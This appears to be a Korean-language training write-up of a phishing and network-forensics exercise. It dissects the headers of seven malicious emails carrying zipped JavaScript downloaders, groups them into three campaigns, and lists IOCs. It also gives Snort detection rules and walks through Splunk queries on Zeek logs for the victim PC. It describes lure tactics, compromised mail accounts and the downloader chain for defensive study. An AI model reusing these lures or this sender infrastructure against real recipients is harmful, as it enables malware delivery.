unzip -l file.zip
sha256sum WU7328899085.zip file.zip
```

```text
Archive:  WU7328899085.zip
     1730  2016-02-03 05:04   file.zip
Archive:  file.zip
     4500  2016-02-02 20:23   invoice_scan_DgyEfl.js
```

### B7단계 — 메일 3 (11:42:38 UTC, smunro에게) — 도용된 ISP 계정 { #email-3 }

**받는 사람:** smunro — Shane Munro, 헬프데스크 기술자.

```text
Received: from localhost ([162.17.68.145])
        by njtocomv02.mcomdc.com with bizsmtp
        id EbiZ1s00Q38388201bicbg; Fri, 05 Feb 2016 06:42:37 -0500
Received: from [68.66.77.76] ([68.66.77.76:32973] helo=dsmdc-mail-smtp.mcomdc.com)
        by mx1.<customer-domain> (envelope-from <tglorfield@mchsi.com>)
        (ecelerity 2.2.3.49 r(42060/42061)) with ESMTP
        id 14/B9-03142-DAA84B65; Fri, 05 Feb 2016 06:42:38 -0500
X-Authenticated-Sender: tglorfield@mchsi.com
```

- **162.17.68.145**가 Mediacom 발송 서버에 처음 넣었고, `dsmdc-mail-smtp.mcomdc[.]com` **[68.66.77.76]**을 거쳐 06:42:38 -0500 = **11:42:38 UTC**에 mx1에 **암호화 없이(ESMTP)** 들어왔습니다.
- `X-Authenticated-Sender: tglorfield@mchsi[.]com` — 진짜 Mediacom 계정에 **로그인해서** 보냈습니다 → PHP 메일러가 아니라 **도용된 계정**일 가능성이 높습니다.
- 그래서 68.66.77.76은 **정상 ISP 서버 — 차단하면 안 됩니다.** 진짜 출발지는 **162.17.68.145**입니다.

| 헤더 | 값 | 읽기 |
|---|---|---|
| From | `"Dorian Potter" <tglorfield@mchsi[.]com>` | 이름 ≠ 주소 |
| Subject | `URGENT - There is a problem with your parcel #362630` | 택배 + 긴급 미끼. `Subject:` 뒤에 공백이 없음 |
| 본문 | `Respected Customer, Dorian Potter …` | 받는 사람이 아니라 **보낸 사람의 가짜 이름**으로 인사 |
| X-ThreatReport (base64) | 디코드하면 `VirusName: ThreatSeeker` | 중간 필터가 **위협으로 표시했는데도 전달됨** |

보안 헤더 디코드하기(글자라서 안전):

```bash
echo 'VmlydXNOYW1lOiBUaHJlYXRTZWVrZXIKU2Nhbm5lcnM6IENDQSgxKSxBVVRIKDIwMTYwMjA1MDkyNiksVGhyZWF0U2Vla2VyKDEp' | base64 -d
```

```text
VirusName: ThreatSeeker
Scanners: CCA(1),AUTH(201602050926),ThreatSeeker(1)
```

**첨부:** `Dorian Potter.zip`(`application/zip`) → **`Dorian Potter.js`**, 4,613 / 7,068바이트. zip 시각 **11:42:30**, 메일 Date **11:42:31** — **보내기 1초 전**에 만들었습니다. 받는 사람마다 첨부를 새로 만드는 대량 발송 도구라서 **메일마다 해시가 다를 겁니다.**

### B8단계 — 메일 4 (13:30:37 UTC, mtraugott에게) — 메일 3과 같은 캠페인 { #email-4 }

**받는 사람:** mtraugott — Matthias Traugott, 애플리케이션 지원 엔지니어.

```text
Received: from localhost ([186.50.4.59])
        by nschwcmgw06p with BigPond Outbound
        id EdWU1s00A1GPwME01dWXeb; Fri, 05 Feb 2016 13:30:33 +0000
Received: from nschwcmgw06p ([61.9.190.166]) by nschwmtas02p.mx.bigpond.com ...
Received: from nschwmtas02p.mx.bigpond.com (nschwmtas02p.mx.bigpond.com [61.9.189.140])
        by mx1.<customer-domain> with ESMTPS id u15DUYUi002575
        (version=TLSv1.2 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=FAIL)
        for <mtraugott@<customer-domain>>; Fri, 5 Feb 2016 13:30:37 GMT
X-Authentication-Info: Submitted using ID jock_margie@bigpond.com
```

- 출발 **186.50.4.59**(186.x는 보통 남미 LACNIC 할당 — WHOIS로 확인) → Telstra BigPond 발송 서버 61.9.190.166 → **61.9.189.140** → mx1, TLS.
- `Submitted using ID jock_margie@bigpond[.]com` — 진짜 BigPond 계정에 로그인 → **도용된 계정**. 61.9.x.x는 정상 Telstra 서버 — **차단 금지**.
- `From: "Emmett Summers" <jock_margie@bigpond.com.au>` — 로그인 ID는 `@bigpond.com`, From은 `@bigpond.com.au`.
- 제목 `URGENT - There is a delay with your purchase #422585`, 본문 `Respected Customer, Emmett Summers` — 메일 3과 거의 같은 문장(package→order, shipping→logistics, 10→5 business days).
- **첨부:** `Emmett Summers.zip` → **`Emmett Summers.js`**, 4,604 / 7,054바이트, zip 시각 **13:30:24**, Date **13:30:25** — 이번에도 보내기 1초 전에 생성.

**이 캠페인의 패턴:** 보낸 사람의 가짜 이름을 인사말**과** zip/js 이름에 그대로 씁니다.

### B9단계 — 메일 5 (13:40:27 UTC, smunro에게) — 메일 1의 쌍둥이 { #email-5 }

```text
Received: by b106.mac7.ru (Postfix, from userid 48)
        id F00EB6885CF; Fri,  5 Feb 2016 16:19:59 +0300 (MSK)
Received: from b106.mac7.ru (b106.mac7.ru [212.232.52.106])
        by mx1.<customer-domain> with ESMTP id u15DeP6g020511
        for <smunro@<customer-domain>>; Fri, 5 Feb 2016 13:40:27 GMT
```

- `b106.mac7[.]ru`[**212.232.52.106**]에서 16:19:59 MSK = 13:19:59 UTC에 나가 13:40:27 UTC에 mx1에 도착(약 20분 대기), 암호화 없음.
- `X-PHP-Originating-Script: 48:configsese.php` — 메일 1과 **같은 스크립트 이름**(앞 숫자는 서버의 사용자 ID라 해킹된 서버마다 다름).
- 제목 `Refund for the Order #284822` — **주문번호까지 같음**.
- From `"Ferdinand Barber" <ipsum.Donec@odioauctor[.]org>` — 또 Lorem ipsum 도메인. `X-Mailer: Windows Live Mail 15.4.3538.513`(위조), `Date: 13:19:15 -0800`(같은 시간대 실수).
- **첨부:** `invoice304-3.zip` → **`invoice304-3.js`**, 2,928 / 7,413바이트, zip 시각 **12:12:24**.

**메일 1과 같은 묶음:** `invoice304-18.js`는 12:12:34 — **10초 차이**입니다. `invoice304-` 뒤 숫자는 한 번에 만든 묶음 안의 번호입니다.

!!! warning "Shane Munro는 두 번 노려졌습니다"
    smunro는 메일 3(11:42, 캠페인 B)**과** 메일 5(13:40, 캠페인 A)를 받았습니다. 헬프데스크 직원은 권한이 높은 경우가 많아 매력적인 표적입니다. 가능하면 **두 시각 이후** 모두 그 PC를 확인하세요.

### B10단계 — 메일 6 (18:23:42 UTC, jdekker에게, **mx2**로) { #email-6 }

```text
Received: by b106.mac7.ru (Postfix, from userid 48)
        id A96CC729DE6; Fri,  5 Feb 2016 18:07:01 +0300 (MSK)
Received: from b106.mac7.ru (b106.mac7.ru [212.232.52.106])
        by mx2.<customer-domain> with ESMTP id u15INfdw020639
        for <jdekker@<customer-domain>>; Fri, 5 Feb 2016 18:23:42 GMT
```

- 같은 서버, 사용자 ID 48, `configsese.php`, 제목 `Refund for the Order #284822`.
- From `"Chaney Vinson" <vestibulum@ullamcorpermagnaSed[.]edu>`, Date `15:06:34 -0800`(같은 실수), X-Mailer WLM 16.4.3528.331.
- **`mx2`로 들어옴** — 회사 메일 서버가 **두 대**입니다. mx1 IP로만 거른 검색은 이 메일을 놓칩니다.
- **첨부:** `invoice304-25.zip` → **`invoice304-25.js`**, 2,922 / 7,571바이트.
- jdekker는 **두 번 노려진 두 번째 사람**입니다(메일 2와 6).

!!! note "정정 — 공격자 PC의 시계"
    이 zip에는 **NTFS 추가 정보**도 있었고, 그 시각은 항상 **UTC**입니다. 수정 시각이 **08:12:38 UTC**였고 DOS 시각은 12:12:38이었으니, 공격자 PC의 시계는 처음 짐작한 MSK(UTC+3)가 아니라 **UTC+4**였습니다. 그러니 `invoice304-N.js` 네 개(DOS 12:12:24, 12:12:34, 12:12:38, 12:12:40)는 모두 **08:12 UTC쯤 16초 안에** 만들어졌고, 하루 종일 여러 서버에서 나눠 보낸 것입니다.

    NTFS 시각 읽는 법: 추가 정보 안에 리틀 엔디언 64비트 FILETIME 값 세 개가 있습니다(1601-01-01부터 100나노초 단위).

    ```bash
    python3 -c "
    import datetime, struct
    v = struct.unpack('<Q', bytes.fromhex('005fe6f9ec5fd101'))[0]
    print(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=v//10))"
    ```

    ```text
    2016-02-05 08:12:38
    ```

### B11단계 — 메일 7 (18:23:43 UTC, culyanova에게) { #email-7 }

- 같은 서버 `b106.mac7[.]ru`, 사용자 ID 48, `configsese.php`, 제목 `Refund for the Order #284822`, **mx1**로 들어옴.
- From `"Linus Kirk" <in.aliquet@nislMaecenasmalesuada[.]com>`, X-Mailer WLM **14.0.8117.416**(메일마다 버전을 바꿈), Date `15:06:27 -0800`.
- **첨부:** `invoice304-27.zip` → **`invoice304-27.js`**, 2,983 / 7,715바이트, zip 시각 12:12:40(= 08:12:40 UTC, 같은 묶음).
- **받는 사람이 시스템 관리자** — 피해가 가장 클 수 있는 표적입니다.

!!! note "정정 — 메일 6과 7이 3시간 늦게 온 이유"
    처음에는 mx1이 메일 6을 거절해서 mx2로 재시도했다고 봤습니다. 메일 7이 그게 아님을 보여 줍니다. 메일 6과 7은 공격자 서버에서 **4초 간격**(18:07:01 / 18:06:57 MSK)으로 나갔고 **1초 간격**(mx2 18:23:42 / mx1 18:23:43)으로 도착했습니다. 둘 다 약 3시간 17분 늦었으니, 지연은 **보낸 쪽 큐**에서 생겼고 그 뒤 MX 두 대로 한꺼번에 나눠 보낸 것입니다.

### B12단계 — 메일 7통을 캠페인으로 묶기 { #email-campaigns }

| # | 도착(UTC) | MX | 받는 사람 | 캠페인 | 연결한 IP | 첨부 → 안의 파일 |
|---|---|---|---|---|---|---|
| 1 | 09:27:04 | mx1 (TLS) | mtsutsumi — 네트워크 보안 엔지니어 | A | 213.133.123.17 | invoice304-18.zip → .js |
| 2 | 09:34:13 | mx1 (TLS) | jdekker — 재무이사 | C | 67.222.128.148 | WU7328899085.zip → file.zip → invoice_scan_DgyEfl.js |
| 3 | 11:42:38 | mx1 | smunro — 헬프데스크 기술자 | B | 68.66.77.76 (출발 162.17.68.145) | Dorian Potter.zip → .js |
| 4 | 13:30:37 | mx1 (TLS) | mtraugott — 애플리케이션 지원 엔지니어 | B | 61.9.189.140 (출발 186.50.4.59) | Emmett Summers.zip → .js |
| 5 | 13:40:27 | mx1 | smunro | A | 212.232.52.106 | invoice304-3.zip → .js |
| 6 | 18:23:42 | **mx2** | jdekker | A | 212.232.52.106 | invoice304-25.zip → .js |
| 7 | 18:23:43 | mx1 | culyanova — 시스템 관리자 | A | 212.232.52.106 | invoice304-27.zip → .js |

- **캠페인 A** — 해킹된 `.ru` 서버의 PHP 메일러 `configsese.php`, 미끼 "Refund for the Order #284822", `invoice304-N.zip`, Lorem ipsum 도메인(`faucibusidlibero[.]com`, `odioauctor[.]org`, `ullamcorpermagnaSed[.]edu`, `nislMaecenasmalesuada[.]com`), 위조 X-Mailer, 엉뚱한 `-0800` Date.
- **캠페인 B** — 도용된 ISP 웹메일 계정(`tglorfield@mchsi[.]com`, `jock_margie@bigpond[.]com`), 미끼 "URGENT - There is a …", 보내기 몇 초 전에 만든 `<가짜 이름>.zip` → `<가짜 이름>.js`.
- **캠페인 C** — 해킹된 `love2date[.]us`의 PHP 메일러(`server.hoast[.]com`, 185.60.133.27이 호출), Western Union 미끼, zip 안의 zip, `www.cehost[.]ro` 외부 이미지.

세 캠페인 모두 **zip 안의 JavaScript 다운로더**입니다. 실행되면 `wscript.exe`가 `.js`를 돌리고 → `.exe`를 받고 → C2로 연결합니다.

### B13단계 — 네트워크 센서가 이 메일들을 볼 수 있나 { #starttls }

!!! warning "STARTTLS는 메일을 숨깁니다"
    맨 위 `Received:`의 `with ESMTPS … TLSv1.2`는 **우리 MX로 들어오는 구간이 암호화됐다**는 뜻입니다. 그 구간의 센서는 TLS만 보고, 제목도 첨부 이름도 못 봅니다.

    - **암호화(ESMTPS):** 메일 1, 2, 4
    - **평문(ESMTP):** 메일 3, 5, 6, 7

    그래서 내용 기반 Snort 룰은 3, 5, 6, 7에서만 울릴 수 있습니다(뒤의 내부 구간 — MX에서 메일 서버로, POP3/IMAP, 웹메일 — 이 평문이면 거기서 다시 보일 수 있음). IP 룰은 그래도 작동하고, Zeek `ssl.log`(25번 포트, 같은 시각과 암호 방식)로 전달 사실은 증명할 수 있습니다.

암호화된 전달을 Splunk로 확인하기(SMTP가 들어 있는 캡처라면):

```spl
index=zeek sourcetype=zeek:ssl id_resp_p=25
| table _time id_orig_h id_resp_h version cipher server_name
```

- `id_resp_p=25` — 서버 포트가 25인 TLS 세션(STARTTLS를 쓴 SMTP).
- 09:27에 `213.133.123.17`이 `TLS_DHE_RSA_WITH_AES_256_GCM_SHA384`로 나오면 메일 1의 `Received:` 헤더와 정확히 맞습니다.

### B14단계 — 이메일 IOC와 이메일 탐지 룰 { #email-iocs }

| 종류 | 값 | 비고 |
|---|---|---|
| IP | 213.133.123.17, 212.232.52.106 | 캠페인 A 발송 서버 |
| IP | 67.222.128.148 | 캠페인 C 발송 서버(server.hoast[.]com) |
| IP | 185.60.133.27 | 캠페인 C PHP 메일러를 호출 — 위협 정보용 |
| IP | 162.17.68.145, 186.50.4.59 | 캠페인 B 출발지(중계 68.66.77.76, 61.9.189.140은 정상 ISP — 차단 금지) |
| 스크립트 | `configsese.php`, `love2date.us/headers/wrigs61.php` | PHP 메일러 |
| 도메인 | faucibusidlibero[.]com, odioauctor[.]org, ullamcorpermagnaSed[.]edu, nislMaecenasmalesuada[.]com, love2date[.]us | 보낸 도메인 |
| 계정 | tglorfield@mchsi[.]com, jock_margie@bigpond[.]com | 도용 계정 |
| 제목 | `Refund for the Order #284822`, `URGENT - There is a …`, `Western Union: Money Transfer For You` | |
| 파일 | invoice304-N.zip/.js, `<이름>.zip/.js`, WU7328899085.zip → file.zip → invoice_scan_DgyEfl.js | |
| "열람" 표시 | www.cehost[.]ro | 메일 2의 외부 이미지 |

이메일용 헤더 기반 Snort 룰(Snort 2). 이 PCAP에는 메일 트래픽이 없어서 **테스트하지 않았습니다.** 위의 STARTTLS 주의도 기억하세요.

```text
alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:"LOCAL PHISH Campaign A configsese.php mailer invoice304 zip"; flow:to_server,established; content:"X-PHP-Originating-Script|3a|"; nocase; content:"configsese.php"; nocase; distance:0; content:"invoice304-"; nocase; distance:0; classtype:trojan-activity; sid:1000001; rev:1;)
alert tcp [213.133.123.17,212.232.52.106] any -> $HOME_NET 25 (msg:"LOCAL PHISH Campaign A known sender servers"; flow:to_server,established; classtype:trojan-activity; sid:1000002; rev:1;)
alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:"LOCAL PHISH Campaign B URGENT delivery lure with zip"; flow:to_server,established; content:"URGENT - There is a"; nocase; content:"Respected Customer,"; nocase; distance:0; content:"application/zip"; nocase; distance:0; classtype:trojan-activity; sid:1000003; rev:1;)
alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:"LOCAL PHISH Campaign C Western Union lure"; flow:to_server,established; content:"Western Union|3a| Money Transfer"; nocase; content:".zip"; nocase; distance:0; classtype:trojan-activity; sid:1000004; rev:1;)
alert tcp 67.222.128.148 any -> $HOME_NET 25 (msg:"LOCAL PHISH Campaign C sender server.hoast.com"; flow:to_server,established; classtype:trojan-activity; sid:1000005; rev:1;)
alert udp $HOME_NET any -> any 53 (msg:"LOCAL PHISH Campaign C email opened - DNS cehost.ro"; content:"|06|cehost|02|ro|00|"; nocase; classtype:trojan-activity; sid:1000006; rev:1;)
```

- `|3a|`는 16진수로 `:`, `|22|`는 `"`. `distance:0` = 다음 글자가 앞의 글자 **뒤에** 나와야 함(헤더 → 본문 → 첨부 순서).
- sid 1000003은 `Subject:` 없이 제목 글자만 찾습니다. 메일 3은 콜론 뒤에 공백이 없기(`Subject:URGENT`) 때문입니다.
- sid 1000006은 DNS 형식입니다: `|06|cehost|02|ro|00|` = 6글자 "cehost", 2글자 "ro", 끝.
- 룰 문법은 [F부](#rule-anatomy)에서 자세히 설명합니다.

---

## C부 — Splunk (Zeek 로그) { #splunk }

### C0단계 — 첫 검색 전에 시간 함정부터 { #splunk-time }

!!! question "질문: 시간대를 UTC로 바꾸려는데 사용자 이름 / Preferences 메뉴가 안 보여요"
    사용자 메뉴는 오른쪽 위 메뉴 줄 맨 왼쪽의 **계정 이름**(`Administrator`, `admin`, 또는 사람 이름)이고, "사용자 이름"이라고 쓰여 있지 않습니다. 창이 좁으면 `☰` 하나로 접혀 보일 수도 있습니다. 관리자 권한이 있으면 **Settings → Users → 내 계정 → Time zone**에서도 바꿀 수 있습니다. 교육용 킷은 이걸 막아 두는 경우가 많습니다. 그럴 땐 아래 두 방법을 쓰세요. 사실 이쪽이 더 확실합니다.

1. **Zeek의 원래 시각을 같이 보기.** Splunk의 `_time`은 *내 계정* 시간대로 바뀌어 보입니다. Zeek의 `ts` 필드는 **UTC** 원래 시각(epoch 초)입니다. `_time` 옆에 `ts`를 두거나 `strftime`으로 바꿔 보세요.
2. **시간 범위는 epoch 숫자로.** `earliest="02/05/2016:09:00:00"`는 내 계정 시간대로 해석됩니다. epoch 숫자는 어디서나 같은 순간입니다.

| UTC | epoch |
|---|---|
| 2016-02-05 00:00 | 1454630400 |
| 2016-02-05 09:00 | 1454662800 |
| 2016-02-05 10:00 | 1454666400 |
| 2016-02-06 00:00 | 1454716800 |

1시간 = 3600, 1분 = 60. 예: 09:27 = 1454662800 + 27×60 = 1454664420.

이번에는 검색 결과 위에 `before 11/18/26 10:21:37 AM`이 나왔는데, 그때 현지 시각(애들레이드, UTC+10:30)이 20:53이었습니다 — 즉 **Splunk 화면은 이미 UTC였습니다.** "before …" 시각과 내 시계를 비교하면 화면 시간대를 빨리 알 수 있습니다.

### C1단계 — 어떤 인덱스와 sourcetype이 있나? { #data-discovery }

**목적:** 검색을 쓰기 전에 실제 인덱스/sourcetype 이름을 알아내기.

```spl
| tstats count where index=* by index sourcetype
| sort index sourcetype
```

- `| tstats` — 이벤트를 하나하나 읽지 않고 색인 정보로 빠르게 셉니다. 맨 앞 `|`는 명령으로 시작한다는 뜻입니다.
- `where index=*` — 모든 인덱스. (`index=*`를 금지하는 환경이면 **Data Summary** 버튼을 쓰세요.)
- `by index sourcetype` — 조합마다 한 줄.
- 시간 범위: **All time**(2016년 데이터라서).

**실제 결과:**

| index | sourcetype | count |
|---|---|---|
| main | csv | 55,893 |
| zeek | zeek:conn | 321 |
| zeek | zeek:dhcp | 5 |
| zeek | zeek:dns | 79 |
| zeek | zeek:files | 245 |
| zeek | zeek:http | 255 |
| zeek | zeek:packet_filter | 1 |
| zeek | zeek:ssl | 113 |
| zeek | zeek:x509 | 28 |

**결과 읽기:**

- sourcetype 이름이 `zeek:conn` 형식입니다(`conn:zeek`이 **아님**). 이 이름 그대로 쓰세요.
- **`zeek:smtp`가 없고**, Kerberos, NTLM도 없습니다 — Zeek가 SMTP를 못 봤습니다.
- 연결이 **321개뿐**입니다. 회사 하루치가 아니라 **알림이 뜬 PC 한 대의 트래픽**입니다. 메일은 이 PCAP 안에 없는 **참고 자료**일 가능성이 높습니다. 그래서 계획이 바뀝니다: *이 PC가 누구인가 → 무엇을 했나 → 어느 메일이 (있다면) 원인인가*.
- Suricata 인덱스는 없습니다. `main`/`csv`(55,893줄)는 확인이 필요합니다.

**필드 이름:** `index=zeek sourcetype=zeek:conn | head 1`을 돌려 필드 목록을 보세요: `id_orig_h`(밑줄), `id_orig_p`, `id_resp_h`, `id_resp_p`, `uid`, `ts`(숫자 `#`), `timestamp`, `local_orig`, `orig_bytes`, `resp_bytes`, `conn_state`, `history`, `service` … 밑줄이라 따옴표 없이 쓸 수 있습니다.

### C2단계 — 캡처 안에 어떤 PC가 있나? { #hosts }

```spl
index=zeek sourcetype=zeek:conn
| stats count by id_orig_h
| sort - count
```

- `stats count by id_orig_h` — 출발 IP별 연결 수.
- `sort - count` — 많은 순(`-` = 내림차순).

**실제 결과:** 한 줄 — **`10.41.245.114` 321**. 모든 연결을 한 PC가 시작했습니다. **이게 조사 대상 PC입니다.**

!!! question "질문: `min(timestamp)` / `max(timestamp)`가 왜 `none`으로 나왔나요?"
    여기서 `timestamp`는 **글자** 필드라서 `min`/`max`가 쓸 만한 값을 못 냈습니다. 숫자인 **`ts`**를 쓰세요([C6](#time-range) 참고).

**티켓 기록:**

```text
[261118 2100, Analyst] Identifying hosts in PCAP (zeek:conn) - Found: single originator 10.41.245.114 (321 conns)
```

### C3단계 — 메일 트래픽이 있나? 메일 IP가 있나? { #mail-check }

```spl
index=zeek sourcetype=zeek:conn id_resp_p IN (25, 110, 143, 465, 587, 993, 995)
| stats count by id_orig_h id_resp_h id_resp_p service
```

- `id_resp_p IN (...)` — 서버 포트가 25/465/587 SMTP(보내기), 110/995 POP3(995 = TLS), 143/993 IMAP(993 = TLS) 중 하나.

**실제 결과:** `No results found.`

```spl
index=zeek sourcetype=zeek:conn (id_orig_h IN (213.133.123.17, 212.232.52.106, 67.222.128.148, 68.66.77.76, 61.9.189.140, 185.60.133.27) OR id_resp_h IN (213.133.123.17, 212.232.52.106, 67.222.128.148, 68.66.77.76, 61.9.189.140, 185.60.133.27))
| table timestamp uid id_orig_h id_orig_p id_resp_h id_resp_p service orig_bytes resp_bytes conn_state
```

- **바깥 괄호가 중요합니다.** 괄호가 없으면 Splunk가 `index=… sourcetype=… id_orig_h IN (…)`를 먼저 묶고 그 뒤에 `OR`를 붙여서, 다른 인덱스까지 걸릴 수 있습니다.

**실제 결과:** `No results found.` — "없다"도 결과입니다. 티켓에 적습니다.

```text
[261118 2102, Analyst] Looking for mail traffic (25/110/143/465/587/993/995) in PCAP - Not Found
[261118 2103, Analyst] Looking for phishing email sender IPs in PCAP - Not Found
```

### C4단계 — `main` / `csv`는 무엇인가? (Snort 알림 데이터) { #snort-csv }

```spl
index=main sourcetype=csv
| stats count by source
```

**실제 결과:** `source = /home/<analyst>/snort/alert.log` — 55,893.

```spl
index=main sourcetype=csv "10.41.245.114"
| head 5
```

- 필드 이름 없이 따옴표 안 글자만 쓰면 모든 이벤트의 **원본 글자**에서 찾습니다. IP가 어느 칸에 있는지 모를 때 좋습니다.

**실제 결과:** `No results found.` `("213.174.33.141" OR "85.93.0.32" OR …)`도 결과 없음.

`index=main sourcetype=csv | head 3`에는 이런 줄이 보입니다.

```text
04/24-10:33:29.804769 ,1,1000100,0,"test",TCP,10.0.0.167,51671,40.97.190.2,993,AC:16:2D:F5:37:E5,20:E5:2A:B6:93:F1,0x62,***AP***,...
```

Snort 2 `alert_csv` 칸 읽는 법:

| # | 값 | 뜻 |
|---|---|---|
| 1 | `04/24-10:33:29.804769` | 알림 시각(연도 없음) |
| 2 | `1` | 엔진 번호(1 = 룰 엔진) |
| 3 | `1000100` | **sid** |
| 4 | `0` | rev |
| 5 | `"test"` | **msg** |
| 6 | `TCP` | 프로토콜 |
| 7–8 | `10.0.0.167`, `51671` | 출발 IP, 포트 |
| 9–10 | `40.97.190.2`, `993` | 도착 IP, 포트 |
| 11–12 | MAC | 출발 / 도착 MAC |
| 나머지 | `***AP***`, `0x…` | TCP 플래그, seq/ack, TTL, ID, 길이 |

**결과 읽기:** **관계없는 2025-04-24 트래픽**에 걸린 **테스트 룰**(sid 1000100, msg "test", 모든 TCP 패킷에 울림)입니다. **이번 사건에 대한 기존 IDS 알림은 없습니다** — 그래서 Snort 룰을 직접 만드는 과제가 있는 겁니다.

!!! note "필드 목록에 `0`, `1`, `53`, `1000100`, `04_24_09_45_43_474446`이 보인 이유"
    Snort CSV에는 **제목 줄이 없습니다.** Splunk가 **첫 데이터 줄을 칸 이름으로** 써 버려서 필드 이름이 엉망이 됐습니다. 제대로 쓰려면 필드 이름을 직접 정해 줘야 합니다(`rex`나 props/transforms 추출).

```text
[261118 2104, Analyst] Locating IDS alerts for 10.41.245.114 (index=main sourcetype=csv) - Not Found: only test rule sid 1000100 "test" on unrelated 2025-04-24 traffic; new Snort rules required
```

### C5단계 — 10.41.245.114는 누구인가? (DHCP) { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp
| table _time client_addr assigned_addr mac host_name domain msg_types
```

- DHCP는 PC가 네트워크 설정을 요청하는 방식입니다. PC는 보통 요청할 때 **컴퓨터 이름**을 같이 보냅니다.
- `client_addr` / `assigned_addr` — 요청한 PC의 IP / 서버가 준 IP.
- `mac` — 하드웨어 주소. IP보다 훨씬 덜 바뀝니다.
- `host_name` — **컴퓨터 이름**.
- `msg_types` — DHCP 메시지 종류.

**실제 결과 (5줄):**

| _time | client_addr | assigned_addr | mac | host_name | msg_types |
|---|---|---|---|---|---|
| 2026-11-18 08:46:31 | 10.41.245.114 | - | 00:17:31:7d:52:ba | **Dekker-PC** | REQUEST |
| 2026-11-18 08:46:31 | 10.41.245.114 | - | 00:17:31:7d:52:ba | Dekker-PC | INFORM |
| … | | | | | REQUEST / INFORM / INFORM |

**결과 읽기:**

- **Dekker-PC** — 직원 목록에 Dekker는 한 명뿐입니다: **Justini H. Dekker, 재무이사**, 로그인 `justini.dekker`, `jdekker@`, 555-5189. **메일 2**와 **메일 6**을 받은 사람입니다.
- `REQUEST` = "이 IP 계속 써도 되나요?", `INFORM` = "IP는 있으니 다른 설정(DNS, 프록시 등)을 알려 주세요". 서버의 ACK가 캡처에 없어서 `assigned_addr`가 `-`입니다 — 중요하지 않습니다.

```text
[261118 2115, Analyst] Identifying host 10.41.245.114 via DHCP - Found: Dekker-PC, MAC 00:17:31:7d:52:ba (Justini Dekker, Finance Director - recipient of Email 2 and Email 6)
```

### C6단계 — `_time` 함정과 진짜 시간 범위 { #time-range }

위의 `_time`을 다시 보세요. 2016년 트래픽인데 **2026-11-18 08:46:31**이고, **모든 이벤트가 같은 값**입니다.

!!! warning "함정: 여기서 `_time`은 로그를 넣은 시각입니다"
    Splunk가 로그를 넣을 때 Zeek 로그 안의 시각을 못 읽어서, 모든 이벤트에 **로그를 넣은 시각**을 붙였습니다. 새 데이터를 보면 항상 `_time`이 말이 되는지 확인하세요. 전부 같거나 날짜가 이상하면 로그 자체의 시각 필드 — 여기서는 숫자 **`ts`** — 를 티켓까지 포함해서 모든 곳에 쓰세요.

```spl
index=zeek sourcetype=zeek:conn
| stats count min(ts) as first max(ts) as last
| eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S")
```

- `min(ts)` / `max(ts)` — 가장 이른 / 가장 늦은 Zeek 시각(epoch 초).
- `eval` — 새 값을 계산합니다. `strftime(숫자, "형식")`은 epoch 초를 읽을 수 있는 날짜로 바꿉니다. `%Y-%m-%d %H:%M:%S` → `2016-02-05 21:24:05`. 쉼표로 `eval` 하나에서 두 필드를 바꿀 수 있습니다.

**실제 결과:** `321  2016-02-05 21:24:05  2016-02-05 21:36:39` (UTC).

**결과 읽기:** **12분 반짜리** 캡처입니다. Dekker의 메일과 비교하면: 메일 2는 09:34(약 12시간 전), 메일 6은 18:23(약 3시간 전). 불가능하진 않지만, 트래픽이 무엇을 말하는지 봐야 합니다.

```text
[261118 2116, Analyst] Note: Splunk _time = index time (all events 2026-11-18 08:46:31); Zeek ts used for event times
[261118 2125, Analyst] Establishing PCAP time range - Found: 2016-02-05 21:24:05 to 21:36:39 UTC
```

### C7단계 — 이 PC는 어디에 연결했나? { #conn-destinations }

```spl
index=zeek sourcetype=zeek:conn
| stats count sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_resp_h id_resp_p service
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

- `by id_resp_h id_resp_p service` — 도착 IP + 포트 + 프로토콜마다 한 줄.
- `sum(orig_bytes) as sent` — 우리 PC가 보낸 양, `sum(resp_bytes) as received` — 서버가 보내 준 양.
- `min(ts) as first` — 처음 연결 시각(처음에는 `_time`으로 썼다가 모든 줄이 08:46:31로 나왔습니다 — `ts`를 쓰세요).
- `sort first` — 일어난 순서대로 읽습니다.

**실제 결과 (59줄 중 일부):**

| id_resp_h | 포트 | service | count | sent | received |
|---|---|---|---|---|---|
| 10.2.41.7 | 53 | dns | 51 | 1,958 | 4,840 |
| 10.2.41.8 | 53 | dns | 10 | 388 | 886 |
| 10.41.245.1 / 255.255.255.255 | 67 | dhcp | 2 / 3 | | |
| 10.41.245.255 | 137 | dns (NetBIOS) | 4 | 1,716 | 0 |
| 148.251.255.26 | 80 | http | 7 (+실패 1) | 15,264 | 389,660 |
| **213.174.33.141** | 80 | http | 6 | 37,240 | **1,694,410** |
| **85.93.0.32** | 80 | http | 2 | 757 | 2,839 |
| **86.106.93.167** | 80 | http | 3 | 2,568 | **500,259** |
| 128.183.114.107 | 80 | - / http | 3 / 1 | 193 | 4,786 |
| **185.86.77.12** | 80 | http | 2 | **2,506** | **616** |
| **192.210.137.123** | 80 | - / http | **8** / 4 | 0 / 12,408 | 0 / 231,436 |
| 80.247.235.238 | 80 | - / http | 5 / 8 | 14,404 | 439,601 |
| 185.21.102.206 | 80 | - / http | 1 / 57 | 24,331 | 2,859,887 |
| 204.79.197.200 | 443 | ssl | 34 | 303,179 | 1,806,037 |
| 216.58.x, 31.13.70.x, 54.231.x, 98.136.x, 131.253.61.x … | 80/443 | http/ssl | | | |

**결과 읽기:**

- 많은 줄이 큰 서비스(구글, 마이크로소프트, 페이스북, 야후, 아마존으로 보이는 대역)입니다 — 평범한 웹서핑. 소유자는 나중에 WHOIS로 확인합니다.
- 이름 모를 IP에서 **큰 HTTP 다운로드**(213.174.33.141, 86.106.93.167, 148.251.255.26, 192.210.137.123) — 무언가를 받았습니다.
- **실패한 연결**(`service`가 `-`, 0바이트) — 악성코드는 여러 서버를 시도하곤 합니다.
- **보낸 양이 받은 양보다 큰** 185.86.77.12 — 웹서핑은 보통 받는 게 훨씬 많습니다. 반대라면 정보를 보고하는 **체크인**일 수 있습니다.

HTTP 내용을 보기 전까지는 의심일 뿐입니다.

